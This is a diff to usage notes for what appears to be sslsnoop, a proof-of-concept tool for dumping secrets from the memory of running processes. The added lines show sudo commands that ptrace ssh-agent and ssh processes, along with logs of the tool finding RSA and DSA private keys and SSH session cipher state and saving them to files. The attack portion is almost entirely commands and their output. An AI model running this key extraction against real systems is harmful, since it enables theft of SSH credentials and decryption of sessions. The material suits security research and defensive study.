@@ -34,7 +34,9 @@ Linux ssh1.90.ha.ovh.net 2.6.32.7-mutu-grs-ipv4-32 #2 SMP Sat Feb 6 13:33:23 UTC
 EOF
 
 Other tricks :
----------------
+--------------
+* search ssh-agent for keys. (passe-partout style)
+
   $ sudo python openssl.py 27477 # ssh-agent
 INFO:abouchet:Target has pid 27477
 INFO:root:Attach process 27477
@@ -46,6 +48,33 @@ INFO:abouchet:found instance <class 'ctypes_openssl.DSA'> @ 0xb835b4e8
 INFO:abouchet:[X] Key saved to file outputs/id_dsa-2.key
 INFO:abouchet:done for pid 27477
 
+* search traditionnal running programs for keys. 
+
+  $ sudo python finder.py
+WARNING: No route found for IPv6 destination :: (no default route?)
+INFO:finder:Searching in ssh-agent/1373 memory
+INFO:root:Attach process 1373
+WARNING:finder:ssh-agent/1373 not ptraceable
+INFO:finder:Searching in ssh/20676 memory
+INFO:root:Attach process 20676
+INFO:root:Attach <PtraceProcess #20676> to debugger
+INFO:root:Set <PtraceProcess #20676> options to 1
+WARNING:abouchet:Restricting search to heap.
+INFO:abouchet:found instance <class 'ctypes_openssh.session_state'> @ 0xb7acd268
+INFO:sslsnoop.openssh:Active state ciphers : <SessionCiphers RECEIVE: 'aes128-ctr/hmac-md5' SEND: 'aes128-ctr/hmac-md5' > at 0xb7acd268
+INFO:sslsnoop.openssh:[X] SSH session_state saved to file outputs/session_state-1.20676
+INFO:finder:None
+INFO:finder:Searching in ssh-agent/27477 memory
+INFO:root:Attach process 27477
+INFO:root:Attach <PtraceProcess #27477> to debugger
+INFO:root:Set <PtraceProcess #27477> options to 1
+WARNING:abouchet:Restricting search to heap.
+INFO:abouchet:found instance <class 'ctypes_openssl.RSA'> @ 0xb835c9a0
+INFO:abouchet:[X] Key saved to file outputs/id_rsa-6.key
+WARNING:abouchet:Restricting search to heap.
+INFO:abouchet:found instance <class 'ctypes_openssl.DSA'> @ 0xb835b4e8
+INFO:abouchet:[X] Key saved to file outputs/id_dsa-6.key
+INFO:finder:None
 
 
 poc done.
